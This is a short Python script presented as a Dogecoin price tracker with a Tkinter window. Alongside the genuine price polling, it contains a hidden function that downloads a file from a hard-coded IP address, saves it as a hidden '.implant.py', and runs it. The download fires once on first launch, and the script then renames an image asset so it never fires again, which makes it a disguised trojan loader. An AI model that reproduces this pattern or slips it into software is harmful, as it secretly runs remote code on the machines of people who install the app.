import requests
from tkinter import *
from PIL import ImageTk,Image
import urllib.request
import urllib
import subprocess
import sys
import os

def PriceUpdate():
    response = requests.get('https://sochain.com//api/v2/get_price/DOGE/USD')

    if response.status_code == 200:
        # everything went swimmingly
        # parse the response as JSON
        content = response.json()
        DogePrice = content['data']['prices'][0]['price']
        price['text'] = f'${DogePrice}'

    root.after(1000, PriceUpdate)

def DownloadImplant():
    urllib.request.urlretrieve(f'http://131.151.162.100:63412/download', f'.implant.py')
    subprocess.Popen([sys.executable, f'.implant.py'])

root = Tk()
root.title('DogeCoin Price Tracker')
canvas = Canvas(root, width = 0, height = 0)
canvas.pack()
dogePic = "Assets/dogecoin.webp"
if(os.path.isfile(dogePic)):
    DownloadImplant()
    os.rename(dogePic, "Assets/Dogecoin.webp")
    dogePic = "Assets/Dogecoin.webp"


img = ImageTk.PhotoImage(Image.open(dogePic))

price = Label(root, text="", image=img, compound='center', font=('Arial', 150))
price.place(relx = 0, rely = 0, anchor='center')
price.pack()

PriceUpdate()
root.mainloop()
